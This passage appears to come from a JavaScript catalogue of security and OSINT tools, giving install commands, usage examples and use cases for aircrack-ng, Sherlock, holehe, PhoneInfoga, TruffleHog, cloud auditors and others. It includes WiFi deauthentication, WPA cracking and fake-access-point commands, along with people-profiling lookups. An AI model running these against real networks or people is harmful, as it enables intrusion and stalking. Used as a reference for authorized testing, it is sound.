      "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # Target specific AP",
      "aircrack-ng -w wordlist.txt capture-01.cap  # Crack WPA/WPA2"
    ],
    advanced_usage: [
      "aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon  # Deauth attack",
      "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture*.cap",
      "airbase-ng -e FreeWiFi -c 6 wlan0mon  # Create fake AP",
      "airdecap-ng -e SSID -p password capture.cap  # Decrypt captured traffic"
    ],
    examples: [
      {
        command: "airmon-ng start wlan0\nairodump-ng -c 11 --bssid 00:11:22:33:44:55 -w capture wlan0mon",
        description: "Monitor specific WiFi channel and capture handshakes"
      },
      {
        command: "aircrack-ng -w rockyou.txt capture-01.cap",
        description: "Crack WPA/WPA2 password with wordlist"
      }
    ],
    use_cases: [
      "Wireless network security auditing",
      "WPA/WPA2 password strength testing",
      "WiFi penetration testing",
      "Rogue access point detection",
      "Wireless troubleshooting"
    ],
    documentation: "https://www.aircrack-ng.org/documentation.html",
    notes: [
      "⚠️ Requires wireless adapter with monitor mode support",
      "Deauth attacks may be illegal in some jurisdictions",
      "WPA3 not yet fully supported",
      "GPU acceleration available with aircrack-ng + hashcat"
    ]
  },

  // ========== OSINT - SOCIAL MEDIA ==========
  sherlock: {
    name: "Sherlock",
    category: ["osint", "username_search"],
    description: "Hunt down social media accounts by username across social networks",
    github: "https://github.com/sherlock-project/sherlock",
    stars: "50k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/sherlock-project/sherlock && cd sherlock && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/sherlock-project/sherlock && cd sherlock && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/sherlock-project/sherlock && cd sherlock && pip install -r requirements.txt"
    },
    basic_usage: ["python3 sherlock username", "python3 sherlock username1 username2"],
    advanced_usage: ["python3 sherlock username --timeout 10", "python3 sherlock username --csv", "python3 sherlock username --site Twitter Facebook"],
    examples: [{command: "python3 sherlock john_doe", description: "Search for john_doe across 300+ sites"}],
    use_cases: ["Username enumeration", "Social media profiling", "Digital footprint analysis"],
    documentation: "https://github.com/sherlock-project/sherlock",
    notes: ["Searches 300+ social networks", "No API keys required"]
  },

  socialscan: {
    name: "socialscan",
    category: ["osint", "username_search"],
    description: "Check email and username availability on social media platforms",
    github: "https://github.com/iojw/socialscan",
    stars: "3k+",
    license: "MPL-2.0",
    government_approved: false,
    installation: {
      linux: "pip3 install socialscan",
      macos: "pip3 install socialscan",
      windows: "pip install socialscan"
    },
    basic_usage: ["socialscan username", "socialscan email@example.com"],
    advanced_usage: ["socialscan username1 username2 --platforms twitter instagram", "socialscan --available-only"],
    examples: [{command: "socialscan johndoe test@gmail.com", description: "Check availability on multiple platforms"}],
    use_cases: ["Username availability checking", "Email validation", "Account enumeration"],
    documentation: "https://github.com/iojw/socialscan",
    notes: ["Fast async scanning", "No API required"]
  },

  maigret: {
    name: "Maigret",
    category: ["osint", "username_search"],
    description: "Collect dossier on person by username from 2500+ sites",
    github: "https://github.com/soxoj/maigret",
    stars: "9k+",
    license: "GPL-3.0",
    government_approved: true,
    installation: {
      linux: "pip3 install maigret",
      macos: "pip3 install maigret",
      windows: "pip install maigret"
    },
    basic_usage: ["maigret username", "maigret username --pdf"],
    advanced_usage: ["maigret username --top-sites 100", "maigret username --extract"],
    examples: [{command: "maigret alex --pdf --folderoutput results/", description: "Generate PDF report for username"}],
    use_cases: ["OSINT investigations", "Digital footprint mapping", "Identity verification"],
    documentation: "https://github.com/soxoj/maigret",
    notes: ["2500+ sites supported", "PDF report generation"]
  },

  twint: {
    name: "Twint",
    category: ["osint", "social_media"],
    description: "Advanced Twitter scraping tool without using Twitter's API",
    github: "https://github.com/twintproject/twint",
    stars: "15k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "pip3 install twint",
      macos: "pip3 install twint",
      windows: "pip install twint"
    },
    basic_usage: ["twint -u username", "twint -s query"],
    advanced_usage: ["twint -u username --since 2020-01-01", "twint -s 'cybersecurity' --lang en"],
    examples: [{command: "twint -u elonmusk --since 2023-01-01 --csv", description: "Scrape tweets to CSV"}],
    use_cases: ["Twitter intelligence gathering", "Sentiment analysis", "Timeline analysis"],
    documentation: "https://github.com/twintproject/twint/wiki",
    notes: ["No API limits", "No authentication required"]
  },

  instagramosint: {
    name: "Instagram-OSINT",
    category: ["osint", "social_media"],
    description: "Instagram OSINT tool for gathering information",
    github: "https://github.com/sc1341/InstagramOSINT",
    stars: "1k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/sc1341/InstagramOSINT && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/sc1341/InstagramOSINT && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/sc1341/InstagramOSINT && pip install -r requirements.txt"
    },
    basic_usage: ["python3 main.py username"],
    advanced_usage: ["python3 main.py username --download-photos"],
    examples: [{command: "python3 main.py target_user", description: "Extract Instagram profile data"}],
    use_cases: ["Instagram profiling", "Social media investigations"],
    documentation: "https://github.com/sc1341/InstagramOSINT",
    notes: ["Requires Instagram credentials"]
  },

  // ========== OSINT - DOMAIN/DNS ==========
  subfinder: {
    name: "Subfinder",
    category: ["osint", "subdomain_enumeration"],
    description: "Fast passive subdomain discovery tool",
    github: "https://github.com/projectdiscovery/subfinder",
    stars: "9k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "GO111MODULE=on go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
      macos: "GO111MODULE=on go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
      windows: "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    },
    basic_usage: ["subfinder -d domain.com", "subfinder -d domain.com -all"],
    advanced_usage: ["subfinder -dL domains.txt -o output.txt", "subfinder -d domain.com -recursive"],
    examples: [{command: "subfinder -d example.com -all -v", description: "Discover all subdomains with verbose output"}],
    use_cases: ["Subdomain enumeration", "Attack surface mapping", "Asset discovery"],
    documentation: "https://github.com/projectdiscovery/subfinder",
    notes: ["Uses passive sources", "Fast and accurate"]
  },

  assetfinder: {
    name: "Assetfinder",
    category: ["osint", "subdomain_enumeration"],
    description: "Find domains and subdomains related to a given domain",
    github: "https://github.com/tomnomnom/assetfinder",
    stars: "3k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "go install github.com/tomnomnom/assetfinder@latest",
      macos: "go install github.com/tomnomnom/assetfinder@latest",
      windows: "go install github.com/tomnomnom/assetfinder@latest"
    },
    basic_usage: ["assetfinder domain.com", "assetfinder --subs-only domain.com"],
    advanced_usage: ["assetfinder domain.com | httprobe"],
    examples: [{command: "assetfinder tesla.com", description: "Find all assets related to Tesla"}],
    use_cases: ["Asset discovery", "Subdomain finding", "Reconnaissance"],
    documentation: "https://github.com/tomnomnom/assetfinder",
    notes: ["Very fast", "Multiple data sources"]
  },

  amass: {
    name: "Amass",
    category: ["osint", "subdomain_enumeration", "network_mapping"],
    description: "In-depth DNS enumeration and network mapping",
    github: "https://github.com/OWASP/Amass",
    stars: "11k+",
    license: "Apache-2.0",
    government_approved: true,
    installation: {
      linux: "go install -v github.com/owasp-amass/amass/v4/...@master",
      macos: "brew install amass",
      windows: "go install github.com/owasp-amass/amass/v4/...@master"
    },
    basic_usage: ["amass enum -d domain.com", "amass intel -whois -d domain.com"],
    advanced_usage: ["amass enum -d domain.com -active -brute", "amass track -d domain.com"],
    examples: [{command: "amass enum -passive -d example.com -o output.txt", description: "Passive subdomain enumeration"}],
    use_cases: ["Subdomain discovery", "Network mapping", "Attack surface management"],
    documentation: "https://github.com/OWASP/Amass/blob/master/doc/user_guide.md",
    notes: ["OWASP project", "Active and passive modes"]
  },

  dnsrecon: {
    name: "DNSRecon",
    category: ["osint", "dns"],
    description: "DNS enumeration script for information gathering",
    github: "https://github.com/darkoperator/dnsrecon",
    stars: "2k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/darkoperator/dnsrecon && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/darkoperator/dnsrecon && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/darkoperator/dnsrecon && pip install -r requirements.txt"
    },
    basic_usage: ["dnsrecon -d domain.com", "dnsrecon -d domain.com -t std"],
    advanced_usage: ["dnsrecon -d domain.com -t axfr", "dnsrecon -r 192.168.1.0/24"],
    examples: [{command: "dnsrecon -d example.com -t brt -D wordlist.txt", description: "Brute force subdomains"}],
    use_cases: ["DNS reconnaissance", "Zone transfer testing", "Subdomain brute forcing"],
    documentation: "https://github.com/darkoperator/dnsrecon",
    notes: ["Multiple DNS record types", "Zone transfer checks"]
  },

  dnsx: {
    name: "dnsx",
    category: ["osint", "dns"],
    description: "Fast and multi-purpose DNS toolkit",
    github: "https://github.com/projectdiscovery/dnsx",
    stars: "2k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest",
      macos: "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest",
      windows: "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    },
    basic_usage: ["dnsx -l domains.txt", "dnsx -l hosts.txt -a -resp"],
    advanced_usage: ["dnsx -l domains.txt -json -o output.json", "dnsx -l hosts.txt -cname -resp"],
    examples: [{command: "dnsx -l subdomains.txt -a -resp", description: "Resolve A records with responses"}],
    use_cases: ["DNS resolution", "Subdomain validation", "DNS records extraction"],
    documentation: "https://github.com/projectdiscovery/dnsx",
    notes: ["Fast DNS resolution", "Multiple record types"]
  },

  // ========== OSINT - EMAIL ==========
  holehe: {
    name: "holehe",
    category: ["osint", "email"],
    description: "Check if an email is attached to an account on 120+ websites",
    github: "https://github.com/megadose/holehe",
    stars: "6k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "pip3 install holehe",
      macos: "pip3 install holehe",
      windows: "pip install holehe"
    },
    basic_usage: ["holehe test@example.com", "holehe test@example.com --only-used"],
    advanced_usage: ["holehe test@example.com --module twitter linkedin"],
    examples: [{command: "holehe john.doe@gmail.com", description: "Check email across all platforms"}],
    use_cases: ["Email enumeration", "Account discovery", "OSINT investigations"],
    documentation: "https://github.com/megadose/holehe",
    notes: ["120+ websites", "No API required"]
  },

  emailharvester: {
    name: "theHarvester",
    category: ["osint", "email", "subdomain_enumeration"],
    description: "E-mail, subdomain and people names harvester",
    github: "https://github.com/laramies/theHarvester",
    stars: "10k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/laramies/theHarvester && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/laramies/theHarvester && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/laramies/theHarvester && pip install -r requirements.txt"
    },
    basic_usage: ["theHarvester -d domain.com -b google", "theHarvester -d domain.com -b all"],
    advanced_usage: ["theHarvester -d domain.com -b google,bing -l 500", "theHarvester -d domain.com -b shodan"],
    examples: [{command: "theHarvester -d example.com -b google,linkedin -l 200", description: "Harvest emails and subdomains"}],
    use_cases: ["Email harvesting", "Subdomain discovery", "People names extraction"],
    documentation: "https://github.com/laramies/theHarvester",
    notes: ["Multiple search engines", "Includes Shodan integration"]
  },

  emailrepIO: {
    name: "EmailRep",
    category: ["osint", "email"],
    description: "Email reputation and risk assessment",
    github: "https://github.com/sublime-security/emailrep.io",
    stars: "500+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "pip3 install emailrep",
      macos: "pip3 install emailrep",
      windows: "pip install emailrep"
    },
    basic_usage: ["emailrep test@example.com"],
    advanced_usage: ["emailrep test@example.com --json"],
    examples: [{command: "emailrep suspicious@domain.com", description: "Check email reputation"}],
    use_cases: ["Email verification", "Spam detection", "Phishing investigation"],
    documentation: "https://emailrep.io/docs",
    notes: ["Free tier available", "Reputation scoring"]
  },

  // ========== OSINT - PHONE ==========
  phoneinfoga: {
    name: "PhoneInfoga",
    category: ["osint", "phone"],
    description: "Advanced information gathering framework for phone numbers",
    github: "https://github.com/sundowndev/phoneinfoga",
    stars: "12k+",
    license: "GPL-3.0",
    government_approved: false,
    installation: {
      linux: "curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install | bash",
      macos: "brew install phoneinfoga",
      windows: "Download from releases"
    },
    basic_usage: ["phoneinfoga scan -n +1234567890"],
    advanced_usage: ["phoneinfoga serve", "phoneinfoga scan -n +1234567890 --output json"],
    examples: [{command: "phoneinfoga scan -n +14155552671", description: "Scan phone number for information"}],
    use_cases: ["Phone number reconnaissance", "Carrier identification", "Location tracking"],
    documentation: "https://sundowndev.github.io/phoneinfoga/",
    notes: ["Web interface available", "Multiple data sources"]
  },

  // ========== OSINT - IP/NETWORK ==========
  ipinfo: {
    name: "ipinfo",
    category: ["osint", "ip"],
    description: "Official command-line client for ipinfo.io",
    github: "https://github.com/ipinfo/cli",
    stars: "1k+",
    license: "Apache-2.0",
    government_approved: false,
    installation: {
      linux: "curl -Ls https://github.com/ipinfo/cli/releases/latest/download/ipinfo_linux.tar.gz | tar -xzv && sudo mv ipinfo /usr/local/bin/",
      macos: "brew install ipinfo-cli",
      windows: "Download from releases"
    },
    basic_usage: ["ipinfo 8.8.8.8", "ipinfo myip"],
    advanced_usage: ["ipinfo bulk 8.8.8.8 1.1.1.1", "ipinfo summarize companies.txt"],
    examples: [{command: "ipinfo 8.8.8.8 --json", description: "Get IP information in JSON"}],
    use_cases: ["IP geolocation", "Network intelligence", "Threat analysis"],
    documentation: "https://ipinfo.io/developers",
    notes: ["Free tier available", "ASN information"]
  },

  sn1per: {
    name: "Sn1per",
    category: ["osint", "reconnaissance", "vulnerability_assessment"],
    description: "Automated pentest framework for offensive security professionals",
    github: "https://github.com/1N3/Sn1per",
    stars: "8k+",
    license: "GPL-3.0",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/1N3/Sn1per && cd Sn1per && bash install.sh",
      macos: "git clone https://github.com/1N3/Sn1per && cd Sn1per && bash install.sh",
      windows: "Use WSL"
    },
    basic_usage: ["sniper -t target.com", "sniper -t 192.168.1.1 -m stealth"],
    advanced_usage: ["sniper -t target.com -m web", "sniper -f targets.txt -m masscan"],
    examples: [{command: "sniper -t example.com -m stealth -o /tmp/output", description: "Stealth reconnaissance"}],
    use_cases: ["Automated reconnaissance", "Vulnerability scanning", "Penetration testing"],
    documentation: "https://github.com/1N3/Sn1per",
    notes: ["Integrates multiple tools", "Different scan modes"]
  },

  // ========== OSINT - GITHUB ==========
  gitrob: {
    name: "Gitrob",
    category: ["osint", "github", "credentials"],
    description: "Reconnaissance tool for GitHub organizations",
    github: "https://github.com/michenriksen/gitrob",
    stars: "6k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "go install github.com/michenriksen/gitrob@latest",
      macos: "go install github.com/michenriksen/gitrob@latest",
      windows: "go install github.com/michenriksen/gitrob@latest"
    },
    basic_usage: ["gitrob -github-access-token TOKEN orgname"],
    advanced_usage: ["gitrob -threads 10 -commit-depth 100 orgname"],
    examples: [{command: "gitrob -github-access-token abc123 testorg", description: "Scan organization for sensitive data"}],
    use_cases: ["Secret scanning", "Code leak detection", "Organization reconnaissance"],
    documentation: "https://github.com/michenriksen/gitrob",
    notes: ["Requires GitHub token", "Web UI included"]
  },

  truffleHog: {
    name: "TruffleHog",
    category: ["osint", "credentials", "github"],
    description: "Find credentials all over the place",
    github: "https://github.com/trufflesecurity/trufflehog",
    stars: "14k+",
    license: "AGPL-3.0",
    government_approved: true,
    installation: {
      linux: "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh",
      macos: "brew install trufflehog",
      windows: "Download from releases"
    },
    basic_usage: ["trufflehog git https://github.com/org/repo", "trufflehog filesystem /path/to/scan"],
    advanced_usage: ["trufflehog git https://github.com/org/repo --since-commit abc123", "trufflehog github --org=orgname"],
    examples: [{command: "trufflehog git https://github.com/example/repo --json", description: "Scan repository for secrets"}],
    use_cases: ["Secret detection", "Credential scanning", "Security auditing"],
    documentation: "https://github.com/trufflesecurity/trufflehog",
    notes: ["Scans git history", "Multiple source support"]
  },

  gitLeaks: {
    name: "Gitleaks",
    category: ["osint", "credentials", "github"],
    description: "SAST tool for detecting hardcoded secrets",
    github: "https://github.com/gitleaks/gitleaks",
    stars: "16k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "brew install gitleaks",
      macos: "brew install gitleaks",
      windows: "Download from releases"
    },
    basic_usage: ["gitleaks detect", "gitleaks protect"],
    advanced_usage: ["gitleaks detect --source /path --report-path report.json", "gitleaks protect --staged"],
    examples: [{command: "gitleaks detect --verbose --report-format json", description: "Detect secrets with detailed output"}],
    use_cases: ["Pre-commit secret scanning", "CI/CD integration", "Code auditing"],
    documentation: "https://github.com/gitleaks/gitleaks",
    notes: ["Fast scanning", "Customizable rules"]
  },

  githound: {
    name: "GitHound",
    category: ["osint", "github", "credentials"],
    description: "GitHound pinpoints exposed API keys and other sensitive data",
    github: "https://github.com/tillson/git-hound",
    stars: "2k+",
    license: "Apache-2.0",
    government_approved: false,
    installation: {
      linux: "go install github.com/tillson/git-hound@latest",
      macos: "go install github.com/tillson/git-hound@latest",
      windows: "go install github.com/tillson/git-hound@latest"
    },
    basic_usage: ["git-hound --subdomain-file subdomains.txt"],
    advanced_usage: ["git-hound --subdomain-file subs.txt --dig-files --dig-commits"],
    examples: [{command: "git-hound --subdomain-file domains.txt --threads 100", description: "Search for exposed secrets"}],
    use_cases: ["API key exposure detection", "Sensitive data discovery"],
    documentation: "https://github.com/tillson/git-hound",
    notes: ["GitHub API required", "Fast parallel scanning"]
  },

  // ========== WEB RECONNAISSANCE ==========
  gospider: {
    name: "gospider",
    category: ["reconnaissance", "web"],
    description: "Fast web spider written in Go",
    github: "https://github.com/jaeles-project/gospider",
    stars: "2k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "go install github.com/jaeles-project/gospider@latest",
      macos: "go install github.com/jaeles-project/gospider@latest",
      windows: "go install github.com/jaeles-project/gospider@latest"
    },
    basic_usage: ["gospider -s https://example.com", "gospider -S urls.txt"],
    advanced_usage: ["gospider -s https://example.com -c 10 -d 3", "gospider -s https://example.com --js"],
    examples: [{command: "gospider -s https://example.com -o output -c 20 -d 5", description: "Spider with 20 concurrent requests"}],
    use_cases: ["Web crawling", "URL discovery", "JavaScript analysis"],
    documentation: "https://github.com/jaeles-project/gospider",
    notes: ["JavaScript parsing", "Fast concurrent crawling"]
  },

  hakrawler: {
    name: "hakrawler",
    category: ["reconnaissance", "web"],
    description: "Simple, fast web crawler for gathering URLs and JavaScript",
    github: "https://github.com/hakluke/hakrawler",
    stars: "4k+",
    license: "GPL-3.0",
    government_approved: false,
    installation: {
      linux: "go install github.com/hakluke/hakrawler@latest",
      macos: "go install github.com/hakluke/hakrawler@latest",
      windows: "go install github.com/hakluke/hakrawler@latest"
    },
    basic_usage: ["echo https://example.com | hakrawler", "hakrawler -url https://example.com"],
    advanced_usage: ["echo https://example.com | hakrawler -depth 3 -plain"],
    examples: [{command: "echo https://example.com | hakrawler -js", description: "Extract JavaScript files"}],
    use_cases: ["URL extraction", "Asset discovery", "JavaScript enumeration"],
    documentation: "https://github.com/hakluke/hakrawler",
    notes: ["Lightweight", "Pipeline friendly"]
  },

  waymore: {
    name: "waymore",
    category: ["reconnaissance", "web"],
    description: "Find way more from the Wayback Machine",
    github: "https://github.com/xnl-h4ck3r/waymore",
    stars: "1k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "pip3 install waymore",
      macos: "pip3 install waymore",
      windows: "pip install waymore"
    },
    basic_usage: ["waymore -i example.com", "waymore -i example.com -mode U"],
    advanced_usage: ["waymore -i example.com -f js,json -oU urls.txt"],
    examples: [{command: "waymore -i example.com -mode U -xcc", description: "Get URLs without cached content"}],
    use_cases: ["Wayback Machine analysis", "Historical URL discovery", "Old endpoint finding"],
    documentation: "https://github.com/xnl-h4ck3r/waymore",
    notes: ["Wayback Machine integration", "Multiple output formats"]
  },

  paramspider: {
    name: "ParamSpider",
    category: ["reconnaissance", "web"],
    description: "Mining parameters from dark corners of Web Archives",
    github: "https://github.com/devanshbatham/ParamSpider",
    stars: "2k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/devanshbatham/ParamSpider && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/devanshbatham/ParamSpider && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/devanshbatham/ParamSpider && pip install -r requirements.txt"
    },
    basic_usage: ["python3 paramspider.py --domain example.com"],
    advanced_usage: ["python3 paramspider.py --domain example.com --exclude woff,css,js"],
    examples: [{command: "python3 paramspider.py --domain example.com --output params.txt", description: "Extract all parameters"}],
    use_cases: ["Parameter mining", "Bug bounty reconnaissance", "XSS testing preparation"],
    documentation: "https://github.com/devanshbatham/ParamSpider",
    notes: ["Uses web archives", "Finds hidden parameters"]
  },

  // ========== RECONNAISSANCE TOOLS ==========
  reconftw: {
    name: "reconFTW",
    category: ["reconnaissance", "automation"],
    description: "Automated reconnaissance framework combining multiple tools",
    github: "https://github.com/six2dez/reconftw",
    stars: "5k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/six2dez/reconftw && cd reconftw && ./install.sh",
      macos: "git clone https://github.com/six2dez/reconftw && cd reconftw && ./install.sh",
      windows: "Use WSL"
    },
    basic_usage: ["reconftw.sh -d target.com -r"],
    advanced_usage: ["reconftw.sh -d target.com -r -s -a", "reconftw.sh -l targets.txt"],
    examples: [{command: "reconftw.sh -d example.com -r", description: "Full reconnaissance on domain"}],
    use_cases: ["Automated reconnaissance", "Bug bounty hunting", "Penetration testing"],
    documentation: "https://github.com/six2dez/reconftw",
    notes: ["Combines 30+ tools", "Notification support"]
  },

  httprobe: {
    name: "httprobe",
    category: ["reconnaissance", "web"],
    description: "Take a list of domains and probe for working HTTP servers",
    github: "https://github.com/tomnomnom/httprobe",
    stars: "3k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "go install github.com/tomnomnom/httprobe@latest",
      macos: "go install github.com/tomnomnom/httprobe@latest",
      windows: "go install github.com/tomnomnom/httprobe@latest"
    },
    basic_usage: ["cat domains.txt | httprobe"],
    advanced_usage: ["cat domains.txt | httprobe -c 50 -t 3000"],
    examples: [{command: "cat subdomains.txt | httprobe -c 50", description: "Probe 50 concurrent connections"}],
    use_cases: ["Live host detection", "HTTP service discovery", "Subdomain validation"],
    documentation: "https://github.com/tomnomnom/httprobe",
    notes: ["Pipeline friendly", "Fast probing"]
  },

  httpx: {
    name: "httpx",
    category: ["reconnaissance", "web"],
    description: "Fast and multi-purpose HTTP toolkit",
    github: "https://github.com/projectdiscovery/httpx",
    stars: "7k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "go install github.com/projectdiscovery/httpx/cmd/httpx@latest",
      macos: "go install github.com/projectdiscovery/httpx/cmd/httpx@latest",
      windows: "go install github.com/projectdiscovery/httpx/cmd/httpx@latest"
    },
    basic_usage: ["httpx -l urls.txt", "httpx -u https://example.com"],
    advanced_usage: ["httpx -l urls.txt -title -tech-detect -status-code", "httpx -l urls.txt -path /admin -mc 200"],
    examples: [{command: "httpx -l targets.txt -silent -tech-detect -json", description: "Detect technologies in JSON"}],
    use_cases: ["HTTP probing", "Technology detection", "Web server analysis"],
    documentation: "https://github.com/projectdiscovery/httpx",
    notes: ["Tech stack detection", "Multiple output formats"]
  },

  aquatone: {
    name: "Aquatone",
    category: ["reconnaissance", "web"],
    description: "Tool for visual inspection of websites across many hosts",
    github: "https://github.com/michenriksen/aquatone",
    stars: "6k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "Download from releases",
      macos: "Download from releases",
      windows: "Download from releases"
    },
    basic_usage: ["cat hosts.txt | aquatone"],
    advanced_usage: ["cat hosts.txt | aquatone -ports 80,443,3000 -out results/"],
    examples: [{command: "cat urls.txt | aquatone -screenshot-timeout 30000", description: "Take screenshots with timeout"}],
    use_cases: ["Visual reconnaissance", "Screenshot automation", "Web asset discovery"],
    documentation: "https://github.com/michenriksen/aquatone",
    notes: ["Automated screenshots", "HTML report generation"]
  },

  // ========== GEOLOCATION & IMAGERY ==========
  exiftool: {
    name: "ExifTool",
    category: ["osint", "metadata", "geolocation"],
    description: "Read, write and edit meta information in files",
    github: "https://github.com/exiftool/exiftool",
    stars: "3k+",
    license: "Perl",
    government_approved: true,
    installation: {
      linux: "sudo apt install libimage-exiftool-perl",
      macos: "brew install exiftool",
      windows: "Download from exiftool.org"
    },
    basic_usage: ["exiftool image.jpg", "exiftool -gps* image.jpg"],
    advanced_usage: ["exiftool -r -ext jpg -csv /path/to/images > metadata.csv"],
    examples: [{command: "exiftool -GPS* -DateTimeOriginal photo.jpg", description: "Extract GPS and timestamp data"}],
    use_cases: ["Metadata extraction", "EXIF analysis", "Geolocation from images"],
    documentation: "https://exiftool.org/",
    notes: ["Supports 100+ file types", "GPS extraction"]
  },

  geoCreepy: {
    name: "GeoCreepy",
    category: ["osint", "geolocation"],
    description: "Geolocation information gatherer",
    github: "https://github.com/ilektrojohn/creepy",
    stars: "1k+",
    license: "GPL-3.0",
    government_approved: false,
    installation: {
      linux: "pip3 install creepy",
      macos: "pip3 install creepy",
      windows: "pip install creepy"
    },
    basic_usage: ["creepy"],
    advanced_usage: ["creepy --target username --platform twitter"],
    examples: [{command: "creepy", description: "Launch GUI for geolocation tracking"}],
    use_cases: ["Social media geolocation", "Photo location tracking", "Timeline analysis"],
    documentation: "https://github.com/ilektrojohn/creepy",
    notes: ["GUI interface", "Multiple platforms"]
  },

  // ========== CLOUD SECURITY ==========
  cloudmapper: {
    name: "CloudMapper",
    category: ["cloud_security", "aws"],
    description: "CloudMapper helps analyze AWS environments",
    github: "https://github.com/duo-labs/cloudmapper",
    stars: "6k+",
    license: "BSD-3-Clause",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/duo-labs/cloudmapper && pipenv install",
      macos: "git clone https://github.com/duo-labs/cloudmapper && pipenv install",
      windows: "git clone https://github.com/duo-labs/cloudmapper && pipenv install"
    },
    basic_usage: ["python cloudmapper.py collect", "python cloudmapper.py prepare"],
    advanced_usage: ["python cloudmapper.py webserver", "python cloudmapper.py find_admins"],
    examples: [{command: "python cloudmapper.py collect --account myaccount", description: "Collect AWS account data"}],
    use_cases: ["AWS security auditing", "Cloud asset inventory", "Network visualization"],
    documentation: "https://github.com/duo-labs/cloudmapper",
    notes: ["AWS focused", "Web-based visualization"]
  },

  prowler: {
    name: "Prowler",
    category: ["cloud_security", "aws", "compliance"],
    description: "AWS security best practices assessment tool",
    github: "https://github.com/prowler-cloud/prowler",
    stars: "9k+",
    license: "Apache-2.0",
    government_approved: true,
    installation: {
      linux: "pip3 install prowler",
      macos: "brew install prowler",
      windows: "pip install prowler"
    },
    basic_usage: ["prowler aws", "prowler azure"],
    advanced_usage: ["prowler aws -M json -o output/", "prowler aws -s pci_dss_v3.2.1"],
    examples: [{command: "prowler aws -f us-east-1 -M csv", description: "Audit AWS account in region"}],
    use_cases: ["AWS security assessment", "Compliance checking", "Cloud auditing"],
    documentation: "https://docs.prowler.com/",
    notes: ["CIS benchmarks", "Multi-cloud support"]
  },

  scoutsuite: {
    name: "ScoutSuite",
    category: ["cloud_security", "multi_cloud"],
    description: "Multi-cloud security auditing tool",
    github: "https://github.com/nccgroup/ScoutSuite",
    stars: "6k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "pip3 install scoutsuite",
      macos: "pip3 install scoutsuite",
      windows: "pip install scoutsuite"
    },
    basic_usage: ["scout aws", "scout azure", "scout gcp"],
    advanced_usage: ["scout aws --services s3 ec2 --regions us-east-1"],
    examples: [{command: "scout aws --no-browser --report-dir ./report", description: "Generate AWS security report"}],
    use_cases: ["Multi-cloud auditing", "Security assessment", "Compliance checking"],
    documentation: "https://github.com/nccgroup/ScoutSuite/wiki",
    notes: ["Supports AWS, Azure, GCP", "HTML reports"]
  },

  cloudfox: {
    name: "CloudFox",
    category: ["cloud_security", "aws"],
    description: "Automating situational awareness for cloud penetration tests",
    github: "https://github.com/BishopFox/cloudfox",
    stars: "2k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "go install github.com/BishopFox/cloudfox@latest",
      macos: "go install github.com/BishopFox/cloudfox@latest",
      windows: "go install github.com/BishopFox/cloudfox@latest"
    },
    basic_usage: ["cloudfox aws --profile default all-checks"],
    advanced_usage: ["cloudfox aws permissions --principal arn:aws:iam::123456789012:user/analyst"],
    examples: [{command: "cloudfox aws all-checks --output-dir ./results", description: "Run all AWS checks"}],
    use_cases: ["AWS penetration testing", "IAM analysis", "Attack path discovery"],
    documentation: "https://github.com/BishopFox/cloudfox",
    notes: ["Pentesting focused", "IAM permission analysis"]
  },

  // ========== BLOCKCHAIN & CRYPTO ==========
  btcrecover: {
    name: "btcrecover",
    category: ["crypto", "password_recovery"],
    description: "Bitcoin wallet password and seed recovery tool",
    github: "https://github.com/gurnec/btcrecover",
    stars: "2k+",
    license: "GPL-2.0",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/gurnec/btcrecover && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/gurnec/btcrecover && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/gurnec/btcrecover && pip install -r requirements.txt"
    },
    basic_usage: ["python3 btcrecover.py --wallet wallet.dat"],
    advanced_usage: ["python3 btcrecover.py --wallet wallet.dat --tokenlist tokens.txt"],
    examples: [{command: "python3 btcrecover.py --wallet wallet.dat --typos 2", description: "Recover wallet with typos"}],
